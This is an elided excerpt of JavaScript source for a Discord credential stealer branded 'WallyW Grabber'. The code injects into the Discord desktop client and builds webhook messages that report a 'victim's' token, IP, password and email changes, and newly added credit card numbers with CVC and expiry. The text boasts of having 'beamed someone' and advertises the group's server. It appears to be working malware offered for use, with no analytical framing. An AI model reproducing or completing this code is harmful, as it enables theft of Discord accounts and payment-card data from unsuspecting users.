        ...
        if (config['init-notify'] == "true") {
            if (fs.existsSync(path.join(__dirname, "blackcap"))) {
                ...
                if (token == null || token == undefined || token == "") {
                    ...
                    const c = {
                        username: "WallyW Grabber",
                        avatar_url: "https://cdn.discordapp.com/attachments/1088742232259035137/1093973734693539961/wallyboss.gif",
                        content: "",
                        embeds: [{
                            title: "Wallyw Initalized",
                    ...
                    if(b.avatar === null){
                        usericonurl = "https://cdn.discordapp.com/attachments/1088742232259035137/1093973734693539961/wallyboss.gif"
                    }else usericonurl = `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}.png?size=600`;
                    if(b.banner === null){
                        bannerurl = "https://cdn.discordapp.com/attachments/1088782168404275250/1094250757747908660/56bbcef39a1fe2499b3b589285a68b9d.png"
                    ...
                    const c = {
                        ...
                        embeds: [{
                            title: "Wallyw Initalized",
                            description: "[<:WDevil:1088438990132232292>  **Oh you have beamed someone**](https://discord.gg/wallyw)",
                            color: config["embed-color"],
                            fields: [{
                                name: "Injection Info",
                    ...
                    if (config['logout-notify'] == "true") {
                        if (token == null || token == undefined || token == "") {
                            ...
                            const c = {
                                ...
                                content: "",
                                embeds: [{
                                    title: "WallyW victim log out (User not Logged in before)",
                                    color: config["embed-color"],
                                    fields: [{
                                        name: "Injection Info",
                            ...
                            const c = {
                                ...
                                content: "",
                                embeds: [{
                                    title: "Wallyw victim got logged out",
                                    description: "[<:WDevil:1088438990132232292>  **Oh you have beamed someone**](https://discord.gg/wallyw)",
                                    color: config["embed-color"],
                                    fields: [{
                                        name: "Injection Info",
    ...
    window.webContents.executeJavaScript(`
        ...
        window.webContents.executeJavaScript(`
            ...
            const params = {
                ...
                content: "",
                embeds: [{
                    "title": "WallyW Detect Password Changed",
                    description: "[<:WDevil:1088438990132232292>  **Oh you have beamed someone**](https://discord.gg/wallyw)",
                    "color": config['embed-color'],
                    "fields": [{
                        name: "Injection Info",
    ...
    window.webContents.executeJavaScript(`
        ...
        window.webContents.executeJavaScript(`
           ...
           const params = {
                ...
                content: "",
                embeds: [{
                        "title": "WallyW Detect Email Changed",
                        description: "[<:WDevil:1088438990132232292>  **Oh you have beamed someone**](https://discord.gg/wallyw)",
                        "color": config['embed-color'],
                        "fields": [{
                                name: "Injection Info",
...
async function CreditCardAdded(number, cvc, expir_month, expir_year, token) {
    ...
    var {
        ...
        const params = {
            ...
            content: "",
            embeds: [{
                    "title": "WallyW Victim Credit Card Added",
                    "description": `
                    **IP:** ${ip}\n\n
